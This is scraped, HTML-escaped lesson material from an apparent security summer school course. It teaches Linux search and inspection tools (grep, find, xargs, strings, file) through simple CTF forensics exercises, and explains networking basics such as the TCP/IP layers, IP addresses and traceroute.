1. [(Re)Discovering the Browser](./rediscovering-the-browser)
1. [Explaining the Internet](./explaining-the-internet)
1. [System Exploration](./system-exploration)
1. [Welcome to Linux](./welcome-to-linux)
Sessions are:
There, you will find a `README.md` file with the session documentation and, if it&amp;#39;s the case, subfolders with support data for the challenges.
Each session is located in its specific folder.
Welcome to the Security Essentials Track of the Security Summer School.
# Security Summer School: Security Essentials Track
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s actually use a pipe.
We&amp;rsquo;ll also use a command from before, so we keep things simple.
Let&amp;rsquo;s find all Linux kernel header files whose names contain the word &amp;ldquo;group&amp;rdquo; and then print them &lt;strong>in reverse order&lt;/strong>:&lt;/p>
&lt;pre tabindex="0">&lt;code>find /usr/src/linux-headers-5.6.0-kali2-common -name *group* | tac
&lt;/code>&lt;/pre>&lt;p>Notice this output is the one you saw in section &lt;a href="#-0-or-more-characters">&lt;code>*&lt;/code>: 0 or more characters&lt;/a>, but in reverse.&lt;/p>
&lt;h4 id="xargs">&lt;code>xargs&lt;/code>&lt;/h4>
&lt;p>We&amp;rsquo;ve seen how powerful pipes are.
Remember that pipes redirect the &lt;code>stdout&lt;/code> of the first command into the second&amp;rsquo;s &lt;code>stdin&lt;/code>.
But what if we wanted to redirect the same &lt;code>stdout&lt;/code> as command line parameters for the second command?&lt;/p>
&lt;p>This is when we would use &lt;code>| xargs&lt;/code>.
Let&amp;rsquo;s assume this hypothetical command:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cmd1 | xargs cmd2
&lt;/code>&lt;/pre>&lt;p>where &lt;code>cmd1&lt;/code> and &lt;code>cmd2&lt;/code> are hypothetical commands.
The &lt;code>| xargs&lt;/code> keyword makes &lt;strong>every line&lt;/strong> from the &lt;code>stdout&lt;/code> of &lt;code>cmd1&lt;/code> be passed &lt;strong>as a separate parameter&lt;/strong> to &lt;code>cmd2&lt;/code>.&lt;/p>
&lt;p>A very powerful use case of &lt;code>xargs&lt;/code> is &lt;code>find ... | xargs grep ...&lt;/code>.
Such commands allow us to look for strings in all files that match certain criteria &lt;strong>at once&lt;/strong>.
Let&amp;rsquo;s showcase this by inspecting all log files about the &lt;code>systemd&lt;/code> process:&lt;/p>
&lt;pre tabindex="0">&lt;code># find /var/log -type f -name *log | xargs grep systemd
&lt;/code>&lt;/pre>&lt;h3 id="less-is-more">Less is More&lt;/h3>
&lt;p>Try running the following command:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# tree -L 2 /
&lt;/code>&lt;/pre>&lt;p>You can see that its output is rather huge.
For large directory hierarchies, &lt;code>tree&lt;/code>&amp;rsquo;s output can be overwhelming.
The same thing can happen when running &lt;code>find&lt;/code> commands.&lt;/p>
&lt;p>We&amp;rsquo;ve already seen how we can trim such outputs down by &lt;code>grep&lt;/code>ping them, but sometimes we have no criterion on which to do so.
In these situations, we have no alternative but to look at the entire output.
In order to do so in more easily, we can use the &lt;code>less&lt;/code> command.&lt;/p>
&lt;p>First of all, &lt;code>less&lt;/code> can be used just like you would use &lt;code>cat&lt;/code>.
Run the commands below.
You can navigate inside &lt;code>less&lt;/code> the same way you can navigate inside &lt;code>man&lt;/code>.
&lt;strong>And you definitely remember how to navigate inside &lt;code>man&lt;/code>!!!&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# cat /var/log/syslog # Never ending logs...
[...]
root@kali:~# less /var/log/syslog # Much better.
&lt;/code>&lt;/pre>&lt;p>Inside &lt;code>less&lt;/code>, try searching for the string &amp;ldquo;network&amp;rdquo;.&lt;/p>
&lt;p>&lt;strong>Remember:&lt;/strong> Don&amp;rsquo;t scroll your terminal.
It doesn&amp;rsquo;t look cool.
Use &lt;code>less&lt;/code>!&lt;/p>
&lt;h3 id="grep">Grep&lt;/h3>
&lt;p>&lt;code>find&lt;/code> has taught us how to use various criteria in order to filter throigh a file hierarhcy.
This is definitely useful, but we can do better.
&lt;code>find&lt;/code> is highly capable of filtering output based on the files&amp;rsquo; &lt;strong>metadata&lt;/strong>, i.e. &amp;ldquo;surface level&amp;rdquo; information, such as sizes, names and so on.&lt;/p>
&lt;p>It would be really useful if we had a means to filter files &lt;strong>based on their content&lt;/strong>.
And we do!
This tool is called &lt;code>grep&lt;/code>.
&lt;code>grep&lt;/code> is capable of matching strings based on the contents of files, not just on their names.&lt;/p>
&lt;p>Let&amp;rsquo;s look for the &amp;ldquo;stdin&amp;rdquo; string in this README:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# grep &amp;#34;stdin&amp;#34; essentials/system-exploration/README.md
#### Standard Input (`stdin`)
- `man`&amp;#39;s `stdin` is the keyboard because it reads user commands and interprets them in order to navigate the current `man` page.
- `bash`&amp;#39;s `stdin` is also the keyboard.
Let&amp;#39;s showcase the usage of `stdin` redirection.
We use `&amp;lt;` in order to redirect `stdin`.
`stdout` is the complement of `stdin`.
We need something similar to that, which can be achieved by using `&amp;gt;&amp;gt;` for redirecting `stdin` and `2&amp;gt;&amp;gt;` for redirecting `stderr`.
&lt;/code>&lt;/pre>&lt;p>As you can see, &lt;code>grep&lt;/code> outputs the &lt;strong>lines that contain the given string&lt;/strong>.
This makes &lt;code>grep&lt;/code> extremely useful for looking for CTF flags.
We simply need to &lt;code>grep &amp;quot;SSS&amp;quot;&lt;/code>.&lt;/p>
&lt;h4 id="grep-a-file-hierarchy">Grep a File Hierarchy&lt;/h4>
&lt;p>At this point, you may be tempted to believe that we can only &lt;code>grep&lt;/code> a single file.
Nope.
We can even &lt;code>grep&lt;/code> strings in entire file hierarchies, which is extremely powerful.&lt;/p>
&lt;p>Let&amp;rsquo;s &lt;code>grep&lt;/code> the &lt;code>task_struct&lt;/code> symbol in our kernel&amp;rsquo;s header files.
This symbol is a C &lt;code>struct&lt;/code> that contains all the information associated with any Linux process.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# grep -R &amp;#34;task_struct&amp;#34; /usr/src/linux-headers-5.6.0-kali2-common | less # The output is rather large, so we contain it with less.
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Remember this distinction:&lt;/strong> &lt;code>find&lt;/code> looks for file &lt;strong>metadata&lt;/strong> (names, permissions, size, type), while &lt;code>grep&lt;/code> looks for file &lt;strong>data&lt;/strong>.&lt;/p>
&lt;h2 id="inspecting-files">Inspecting Files&lt;/h2>
&lt;p>Now that we can find our way inside a file hierarchy, we need a means by which to inspect those files.
&lt;code>grep&lt;/code> works just fine, provided we&amp;rsquo;re dealing with text files.
But what if we aren&amp;rsquo;t?&lt;/p>
&lt;p>In this case, we&amp;rsquo;ll need to taka a sneak peak into some &lt;em>binary analysis&lt;/em>.
We&amp;rsquo;ll get back to this subject starting from from Session &lt;a href="../data-representation">Data Representation&lt;/a>.&lt;/p>
&lt;h3 id="file">&lt;code>file&lt;/code>&lt;/h3>
&lt;p>First, we want to get some more detailed information about what type of binary file we are dealing with specifically.
&lt;code>ls&lt;/code> already gives us information such as the file&amp;rsquo;s name, size and permissions.
This is all fine, but this information is common to all files. Whether we&amp;rsquo;re dealing with an image, or with an executable file &lt;code>ls&lt;/code> won&amp;rsquo;t tell us.&lt;/p>
&lt;p>But &lt;code>file&lt;/code> does.
&lt;code>file&lt;/code> works by reading a file&amp;rsquo;s header (the first few bytes at the beginning of the file, which hold information about its format and type).
Thus, it is capable of outputting more precise information than &lt;code>ls&lt;/code>.
Let&amp;rsquo;s test it using one of today&amp;rsquo;s challenges, &lt;code>activities/05-challenge_not-your-doge/public/not-doge.pnm&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~/essentials/system-exploration# file activities/05-challenge_not-your-doge/public/not-doge.pnm
activities/05-challenge_not-your-doge/public/not-doge.pnm: Netpbm image data, size = 500 x 590, rawbits, pixmap
&lt;/code>&lt;/pre>&lt;h3 id="strings">&lt;code>strings&lt;/code>&lt;/h3>
&lt;p>One of the most basic forms of binary analysis is to simply look for any human-readable string present in a binary file.
For this purpose, we&amp;rsquo;ll use the &lt;code>strings&lt;/code> command.&lt;/p>
&lt;h4 id="tutorial-doge">Tutorial: Doge&lt;/h4>
&lt;p>The best way to showcase the &lt;code>strings&lt;/code> command is to use it in order to find our first flag for today.
Head to the &lt;code>activities/doge/public&lt;/code> folder and take a look at the image you&amp;rsquo;ve been given.&lt;/p>
&lt;p>Since this section is dedicated to the &lt;code>strings&lt;/code> command, we&amp;rsquo;ll run this command on our &lt;code>doge.jpg&lt;/code> file:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~/essentials/system-exploration/activities/doge/public# strings doge.jpg
JFIF
[...]
eP!_&amp;#34;
&lt;/code>&lt;/pre>&lt;p>So there are lots of human-readable strings in this image, but very few, if any, actually make any sense.
In order to filter them out, we&amp;rsquo;ll use what we&amp;rsquo;ve learned today: &lt;code>|&lt;/code> + &lt;code>grep&lt;/code>.
We&amp;rsquo;ll try to find the flag itself.
Maybe we get lucky.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~/essentials/system-exploration/activities/doge/public# strings doge.jpg | grep SSS
&amp;lt;there should be a flag here&amp;gt;
&lt;/code>&lt;/pre>&lt;p>That&amp;rsquo;s how you use &lt;code>strings&lt;/code>: often in combination with some filtering mechanism, such as &lt;code>grep&lt;/code>.&lt;/p>
&lt;p>Another way to get the flag is to run the &lt;code>file&lt;/code> command:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~/essentials/system-exploration# file activities/doge/public/doge.jpg
activities/doge/public/doge.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: &amp;#34;SSS{grep_your_strings}&amp;#34;, progressive, precision 8, 500x500, components 3
&lt;/code>&lt;/pre>&lt;p>The flag is included in the file as a comment.
Image comments are often used in CTFs in order to hide some more subtle information, such as hints.
Always remember to check them out.&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>Here are a few useful snippets from today&amp;rsquo;s session:&lt;/p>
&lt;ul>
&lt;li>&lt;code>grep -R &amp;quot;some string&amp;quot; /some/path&lt;/code>: recursively looks for &amp;ldquo;some string&amp;rdquo; inside all the files in the &lt;code>some/path&lt;/code> directory;&lt;/li>
&lt;li>&lt;code>find /some/path -name *flag* -type f&lt;/code>: recursively searches for regular files in the &lt;code>/some/path&lt;/code> directory, whose names include the word &lt;code>flag&lt;/code>;&lt;/li>
&lt;li>&lt;code>cat large_file | grep SSS&lt;/code>: looks for the &lt;code>SSS&lt;/code> string in a large file, so you don&amp;rsquo;t have to do this manually;&lt;/li>
&lt;li>&lt;code>find some/path &amp;lt;some criteria&amp;gt; | xargs grep SSS&lt;/code>: look for the &lt;code>SSS&lt;/code> string in each file that matches some specified criteria.&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;h3 id="challenge-surgical-precision">Challenge: Surgical Precision&lt;/h3>
&lt;p>There are many false flags out there.
Answer the questions and find the &lt;strong>real&lt;/strong> flags.
The quizzes cover subjects discussed today and during the previous session.
Think of them as a recap.&lt;/p>
&lt;p>The answer to each of the riddles in the files &lt;code>question-*&lt;/code> from the &lt;code>activities/surgical-precision/public&lt;/code> is the name of one of the given files.
When you&amp;rsquo;ve found an answer, upload the flag in that file.&lt;/p>
&lt;p>Beware of &lt;a href="https://en.wikipedia.org/wiki/Red_herring">red herrings&lt;/a>!&lt;/p>
&lt;h3 id="challenge-empty-files">Challenge: Empty Files&lt;/h3>
&lt;p>So many empty files&amp;hellip;
Nevertheless, you must find the flag!&lt;/p>
&lt;h3 id="challenge-find-us-if-you-can">Challenge: Find Us If You Can&lt;/h3>
&lt;p>This is a two-stage challenge.
The first flag is somewhere on the remote system.
Use the hint it comes with, in order to figure out the second flag as well.&lt;/p>
&lt;h3 id="challenge-not-your-doge">Challenge: Not Your Doge&lt;/h3>
&lt;p>The image is in &lt;code>.pnm&lt;/code> format.
It has a rather simple header, that you can find &lt;a href="https://en.wikipedia.org/wiki/Netpbm#PPM_example">here&lt;/a>(&lt;code>.pnm&lt;/code>s are almost the same as &lt;code>.ppm&lt;/code>s; it&amp;rsquo;s just the data encoding that differs).
But it&amp;rsquo;s incomplete.
Find a way to reveal it completely.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;h2 id="forensics">Forensics&lt;/h2>
&lt;p>The greater CTF topic of today has been &lt;strong>forensics&lt;/strong>.
It&amp;rsquo;s probably one of the vastest and most diverse topics out there, because it doesn&amp;rsquo;t really fit into many patterns.
You can read more about forensics &lt;a href="https://trailofbits.github.io/ctf/forensics/">here&lt;/a>.&lt;/p>
&lt;h3 id="regular-expressions">Regular Expressions&lt;/h3>
&lt;p>Regular expressions are like globs on steroids.
They provide a huge step-up in terms of expressiveness.
As expected, they&amp;rsquo;re also more difficult to understand.&lt;/p>
&lt;p>By default, &lt;code>grep&lt;/code> actually matches regular expressions, not just raw strings.
&lt;code>find&lt;/code> can also look fore files matching regular expressions, by using the &lt;code>-regex&lt;/code> and &lt;code>-regextype&lt;/code> parameters (yes, there are multiple regex syntaxes).&lt;/p>
&lt;p>A good point from which to start learning how to use regular expressions are these resources:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285">https://medium.com/factory-mind/regex-tutorial-a-simple-cheatsheet-by-examples-649dc1c3f285&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://regexone.com/">https://regexone.com/&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>For testing your regular expressions before using them, &lt;a href="https://regex101.com/">this website&lt;/a> is king.&lt;/p>
&lt;p>Once you&amp;rsquo;ve got the hang of regular expressions, test your skills in the &lt;a href="https://regexcrossword.com/">Regex Crossword&lt;/a>.
Yes, such a thing really does exist and it&amp;rsquo;s as crazy as you might think.
Give it a try!&lt;/p>
&lt;p>Moreover, most programming languages have libraries for regular expressions.
Python can do so, too.
Take a look at its &lt;a href="https://docs.python.org/3/library/re.html">regex module&lt;/a>.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/explaining-the-internet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/explaining-the-internet/</guid><description>
&lt;h1 id="explaining-the-internet">Explaining the Internet&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>In this session, we&amp;rsquo;ll discuss some networking fundamentals.
By doing so, we&amp;rsquo;ll lay the foundations for some of our later sessions regarding networking and the Internet, such as &lt;a href="../rediscovering-the-browser">(Re)Discovering the Browser&lt;/a>
and &lt;a href="../hacking-the-web">Hacking the Web&lt;/a>.&lt;/p>
&lt;p>Moreover, we&amp;rsquo;ll explain what happens when you access a URL (we&amp;rsquo;ll also learn how to do this from our terminals).
Last but not least, we&amp;rsquo;ll see what those &lt;code>ssh&lt;/code> commands you&amp;rsquo;ve been using in order to solve the remote challenges mean.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;p>For this session, you&amp;rsquo;ll need:&lt;/p>
&lt;ul>
&lt;li>a working internet connection;&lt;/li>
&lt;li>a Linux environment that you&amp;rsquo;re comfortable working with;&lt;/li>
&lt;li>to understand what a &lt;em>process&lt;/em> is;&lt;/li>
&lt;li>general knowledge of the Linux CLI, as discussed in session &lt;a href="../welcome-to-linux">Welcome to Linux&lt;/a>.&lt;/li>
&lt;/ul>
&lt;h2 id="a-general-overview-of-the-internet">A General Overview of the Internet&lt;/h2>
&lt;p>Before learning how to use and, later, how to hack the Internet, let&amp;rsquo;s first understand its building blocks.
The Internet is all about sending data to and from an enormous amount of hosts.&lt;/p>
&lt;p>In order to learn how all of this works, let&amp;rsquo;s start from the example below.
It&amp;rsquo;s generic enough for it to be relatable to most networking scenarios.
Yet, it encompasses everything we need to talk about.&lt;/p>
&lt;p>&lt;img src="./assets/network_stack.png" alt="Network Stack">&lt;/p>
&lt;p>So what happens here is that the computer on the left is trying to &lt;strong>send&lt;/strong> data to the one on the right.
We call the left computer &lt;strong>the sender&lt;/strong> and the right one &lt;strong>the receiver&lt;/strong>.
The two computers are connected via a &lt;strong>medium&lt;/strong> on which the actual bits of data that make up the communication are sent.
In short, this medium is the connection between the aforementioned computers.&lt;/p>
&lt;p>However, there are 4 boxes above the aforementioned medium.
These boxes are altogether known as &lt;strong>The TCP/IP Network Stack&lt;/strong>.
We&amp;rsquo;ll see what&amp;rsquo;s with the &lt;em>TCP/IP&lt;/em> part soon enough.
Individually, each box is a &lt;strong>layer&lt;/strong>.
Here are the 4 layers of the TCP/IP stack:&lt;/p>
&lt;p>&lt;img src="./assets/tcp_ip_network_stack.svg" alt="The TCP/IP Network Stack">&lt;/p>
&lt;p>Each layer provides a well-defined set of requirements, which are fulfilled by &lt;strong>protocols&lt;/strong>.
A networking protocol is a set of rules that define the communication (data formatting and processing) between the same two levels of the network stack.
For example, there are protocols for the transport layer, others for the link layer and so on.
We&amp;rsquo;ll talk about them in a bit.&lt;/p>
&lt;h3 id="encapsulation">Encapsulation&lt;/h3>
&lt;p>Each layer takes care of a specific requirement of networking, as we&amp;rsquo;ll discuss shortly.
When sending data, each of the layers in the TCP/IP model accepts data from the layer above (or from the user in the case of the application layer), and adds additional information to the data that is necessary for that layer to carry out its task.
In some cases, the original data may be processed in some way before the additional information is added.
For example, it might be encrypted.
The layer then passes this data on to the layer below (or onto the transmission medium in the case of the link layer).&lt;/p>
&lt;p>The arrival of data from an upper layer may trigger additional separate messages to be sent to the receiving end.
For instance, if the data needed to be encrypted, the layer that carries out the encryption has to exchange initial setup messages with the receiving end to agree the encryption method and other data that we&amp;rsquo;ll touch on in the session &lt;a href="../data-security">Data Security&lt;/a>, before the encrypted data can be transferred.&lt;/p>
&lt;p>At the receiving end, the process happens in reverse: each layer accepts data from the layer below, inspects and removes the additional information added on by the corresponding layer in the sending end, before passing it up to the layer above.&lt;/p>
&lt;p>Data is passed from a sender process to a receiver process by using the services of the layer below.
It is only the final layer that actually causes the data to be transmitted onto the transmission media (e.g. cable). Below is a representation of this whole mechanism.&lt;/p>
&lt;p>&lt;img src="./assets/network_layers.png" alt="General Workings of a Network Stack Layer">&lt;/p>
&lt;p>This method of modular communication is called &lt;strong>encapsulation&lt;/strong>.
It can be likened to taking the data from the layer above and placing it in an &lt;strong>envelope&lt;/strong>, writing some additional information on the envelope, then passing the envelope to the layer below.
At the receiving end, a layer is passed an envelope from the layer below.
It looks at the data on the outside of the envelope to decide what to do with the contents of the envelope.
It then opens the envelope and passes the contained data up to the next level. The reverse of encapsulation is &lt;strong>decapsulation&lt;/strong>.
After a message has passed through the network stack, it ends up in a &lt;em>matrioshka&lt;/em> of envelopes, one for each layer, each with its own, specific information.&lt;/p>
&lt;h3 id="a-bit-of-nomenclature">A Bit of Nomenclature&lt;/h3>
&lt;p>As we said previously, each of the layers of the TCP/IP model adds its own information to the data coming from the layer above.
This encapsulation at each layer results in a new structure effectively wrapping up the original data.
Each of these has a specific name depending on the layer that creates it:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">TCP/IP Layer&lt;/th>
&lt;th style="text-align:center">Name of data block produced by the layer&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">Application&lt;/td>
&lt;td style="text-align:center">Application data (e.g. HTTP, HTTPS)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">Transport&lt;/td>
&lt;td style="text-align:center">Segments (TCP) or datagrams (UDP)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">Internet&lt;/td>
&lt;td style="text-align:center">Packets (e.g IP packet)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">Link&lt;/td>
&lt;td style="text-align:center">Frames (e.g. Ethernet frame)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="the-medium">The Medium&lt;/h2>
&lt;p>This layer is not mentioned in the above diagrams, but is worth talking a little bit about.
The medium represents the connection itself between the 2 stations.
This connection can be:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>wired&lt;/strong>: using a cable on which digital signals that encode the bits are sent&lt;/li>
&lt;li>&lt;strong>wireless&lt;/strong>: using high-frequency radio waves in order to send the same signals as before&lt;/li>
&lt;/ul>
&lt;h2 id="the-link-layer">The Link Layer&lt;/h2>
&lt;p>This layer is also known as the &lt;strong>Data Link&lt;/strong> layer.&lt;/p>
&lt;p>It represents the underlying technology of any application.
The device on which the application is running may have a choice of many technologies to connect to a network, such as Ethernet, WiFi, Bluetooth, 4G, 5G (&lt;em>tinfoil hat off&lt;/em>) etc.
Where more than one link exists, the operating system of the device chooses the most appropriate link.
For instance, a mobile phone might be connected to both 4G and WiFi.
Most mobile phones prefer the WiFi connection, but remain connected to 4G mobile data, which they use as backup.
However, in some cases the application itself may dictate the choice of link, e.g. the mobile phone may decide to send traffic over WiFi to avoid 4G data charges.
Once the link has been chosen, the appropriate link layer protocol is selected.&lt;/p>
&lt;p>The most commonly used link layer protocol is &lt;strong>Ethernet&lt;/strong>.
Wired or wireless Ethernet is used on most local area networks (LANs).
The packets from the internet layer are further encapsulated in Ethernet frames which are designed to be transported across a local network.&lt;/p>
&lt;p>This layer needs a means to identify local stations.
This is where the &lt;strong>Media Access Control (MAC) addresses&lt;/strong> come in.
They are 48 bits long and are unique to a specific &lt;strong>Network Interface Card (NIC)&lt;/strong>.
The MAC address is physically tied to the hardware of the computer, which means it may also be referred to as the hardware or physical address.&lt;/p>
&lt;h2 id="the-internet-layer">The Internet Layer&lt;/h2>
&lt;p>So each NIC has its own 48-bit MAC address.
This means there are &lt;code>2^48&lt;/code> unique MACs, which means &lt;code>2^48&lt;/code> unique NICs.
&lt;code>2^48&lt;/code> is a huge number, which is way beyond everything humanity has produced so far.
So, since we aren&amp;rsquo;t likely to run out of MAC addresses any time soon, a host can be easily identified in the Internet via its MAC, right?
Yes, it can.&lt;/p>
&lt;p>There is one problem, though.
Suppose the sender is in the US and the receiver is in India.
There&amp;rsquo;s no way you can connect these two hosts using the same medium.
You need some intermediaries: &lt;strong>routers&lt;/strong>.&lt;/p>
&lt;h3 id="routers">Routers&lt;/h3>
&lt;p>It is impossible to connect your PC / laptop directly (physically) to every PC or server in the world.
Therefore, we need &lt;strong>networks&lt;/strong>, which are basically aggregations of hosts (servers, PCs, laptops, mobile phones etc.).&lt;/p>
&lt;p>Each network contains one &lt;strong>router&lt;/strong> which sends data between the hosts in its network and those on other networks.
So a router is a networking device that connects two or more networks.
Think of the router you most probably have at home.
There is a &lt;em>local network&lt;/em>, to which you can connect via WiFi, or Ethernet cables.
You&amp;rsquo;re probably doing this right now.
Another network is the one provided by your Internet Service Provider (ISP).&lt;/p>
&lt;p>There are many ISPs around the world and even more local home networks.
The web thus becomes a &lt;em>web of routers&lt;/em> who transmit &lt;strong>packets&lt;/strong> from one network to another.
Back to our example above, you will surely need many routers to get a packet from the US to India.&lt;/p>
&lt;p>But how does a router know how where to send a packet?
Let&amp;rsquo;s say a router R1 connects a laptop with IP 192.168.100.5 and a PC with IP 192.168.100.10 to the external network, as shown in the image below.&lt;/p>
&lt;p>&lt;img src="./assets/router_in_action.svg" alt="Router in Action">&lt;/p>
&lt;p>Now let&amp;rsquo;s look at 2 different scenarios:&lt;/p>
&lt;ol>
&lt;li>If the laptop sends a packet to IP &lt;code>192.168.100.10&lt;/code>, the router knows this address is part of its &lt;strong>Local Area Network (LAN)&lt;/strong> and sends it directly to the PC.&lt;/li>
&lt;li>If the PC sends a packet to &lt;code>upb.ro&lt;/code> (with IP &lt;code>141.85.220.33&lt;/code>), the router sees its IP as an external address. Therefore, it passes it into the internet, where other routers take it and then pass it again to other routers and so on, until the packet reaches &lt;code>upb.ro&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>Each new router that a packet encounters on its way from source to destination is called a &lt;strong>hop&lt;/strong>.
Most often, a hop is a router.
In order to visualise the hops that our requests to a well-known service, such as &lt;code>google.com&lt;/code>, we use the &lt;code>traceroute&lt;/code> command:&lt;/p>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ traceroute google.com
traceroute to google.com (142.250.185.206), 30 hops max, 60 byte packets
1 _gateway (10.0.2.2) 0.212 ms 0.123 ms 0.228 ms
2 10.20.21.254 (10.20.21.254) 2.815 ms 3.908 ms 3.838 ms
3 109.101.201.49 (109.101.201.49) 4.894 ms 4.971 ms 4.810 ms
4 193.231.103.0 (193.231.103.0) 9.634 ms 9.467 ms 9.359 ms
5 10.0.241.109 (10.0.241.109) 8.547 ms 9.129 ms 9.958 ms
6 * * *
7 10.0.240.194 (10.0.240.194) 59.356 ms 39.555 ms 10.0.200.6 (10.0.200.6) 39.579 ms
8 10.0.240.121 (10.0.240.121) 39.426 ms 39.373 ms 38.338 ms
9 92.87.30.10 (92.87.30.10) 42.521 ms 39.938 ms 41.795 ms
10 * 10.252.185.126 (10.252.185.126) 40.778 ms *
11 142.250.226.148 (142.250.226.148) 38.924 ms 172.253.73.152 (172.253.73.152) 41.083 ms 108.170.252.1 (108.170.252.1) 42.216 ms
12 142.250.225.77 (142.250.225.77) 39.563 ms 108.170.252.18 (108.170.252.18) 40.317 ms 142.250.225.77 (142.250.225.77) 36.148 ms
13 fra16s52-in-f14.1e100.net (142.250.185.206) 40.195 ms 209.85.242.79 (209.85.242.79) 39.355 ms 108.170.236.249 (108.170.236.249) 38.919 ms
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s explain the output.
Each line represents a &lt;strong>hop&lt;/strong> (i.e. a router) that a packet must pass through in order to reach &lt;code>google.com&lt;/code>.
The first number is the index of the hop.
The second is the &lt;em>IP&lt;/em> of the network.
You&amp;rsquo;ve probably heard about IPs before.
We&amp;rsquo;ll demystify them in a bit.
&lt;code>traceroute&lt;/code> sends 3 packets, for consistency.
It counts the time it takes from sending each of these packets to the moment the response reaches the sender.
This time is called &lt;strong>Round Trip Time (RTT)&lt;/strong>.
As we said, &lt;code>traceroute&lt;/code> sends and monitors 3 packets in order to display the consistency of the link to each hop.&lt;/p>
&lt;p>The first hop is between the VM and the host.
The other is the router to which the host is connected.
From then on, it&amp;rsquo;s the wild Internet itself.&lt;/p>
&lt;h3 id="ip-addresses">IP Addresses&lt;/h3>
&lt;p>IP addresses or, in short, &lt;strong>IPs&lt;/strong>, are 32-bit (i.e. 4 bytes) numbers used to identify &lt;strong>hosts&lt;/strong>.
IP stands for &lt;strong>Internet Protocol&lt;/strong>, which is the most widely used internet layer protocol.
Notice the difference between IPs and MACs.
While MACs are associated with NICs, IPs are associated with hosts.
Another difference is that whereas a MAC is unique to and engraved into the NIC, a host can change its IP more easily.
We won&amp;rsquo;t go into this in today&amp;rsquo;s session, but you can read about one such mechanism called &lt;a href="#dhcp">DHCP&lt;/a>.&lt;/p>
&lt;p>Of course you are free to express an IP address however you like, but by far the most common representation is to write each of its 4 bytes individually, in the decimal base, separated by a dot (&lt;code>.&lt;/code>).
You&amp;rsquo;ve already seen IP&amp;rsquo;s when connecting to the remote hosts during the previous sessions.
Some IPs are:&lt;/p>
&lt;ul>
&lt;li>&lt;code>8.8.8.8&lt;/code>: is the address of Google&amp;rsquo;s Public DNS Service.
We&amp;rsquo;ll explain what the DNS is in a future &lt;a href="#the-domain-name-system">section&lt;/a>.&lt;/li>
&lt;li>&lt;code>69.63.176.13&lt;/code>: is a common IP address used by Facebook&lt;/li>
&lt;li>&lt;code>141.85.224.100&lt;/code>: is IP the address of one of the machines in our CTF infrastructure&lt;/li>
&lt;/ul>
&lt;p>In order to see the IP of your machine, run the following command:&lt;/p>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ ip address show
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
link/ether 08:00:27:3c:2a:8d brd ff:ff:ff:ff:ff:ff
inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
valid_lft 86379sec preferred_lft 86379sec
inet6 fe80::262a:29ff:8129:db77/64 scope link noprefixroute
valid_lft forever preferred_lft forever
&lt;/code>&lt;/pre>&lt;p>Your output may differ slightly.&lt;/p>
&lt;p>An IP address is associated with a &lt;strong>network interface&lt;/strong>.
These interfaces can be virtual or physical (present on your NIC).
In your Kali VM, all interfaces are virtual.&lt;/p>
&lt;p>&lt;strong>&lt;code>lo&lt;/code>&lt;/strong> is the &lt;strong>loopback&lt;/strong> interface.
It&amp;rsquo;s an internal interface that each host possesses.
Its purpose is for testing the OS&amp;rsquo;s TCP/IP stack.
Its IP is, by convention &lt;code>127.0.0.1&lt;/code>, or &lt;code>0.0.0.0&lt;/code>.&lt;/p>
&lt;p>&lt;strong>&lt;code>eth0&lt;/code>&lt;/strong> is the interface used to connect to the Internet.
It acts as a middleman between your host OS (the one in which you&amp;rsquo;re running the VM) and the guest OS (Kali).
Its status is &lt;em>UP&lt;/em> (i.e. it&amp;rsquo;s running) and its IP address is &lt;code>10.0.2.15&lt;/code>.&lt;/p>
&lt;p>Notice the &lt;code>/24&lt;/code> part.&lt;/p>
&lt;h4 id="ping">&lt;code>ping&lt;/code>&lt;/h4>
&lt;p>In order to test whether a host is up or down, we can &lt;code>ping&lt;/code> its IP.
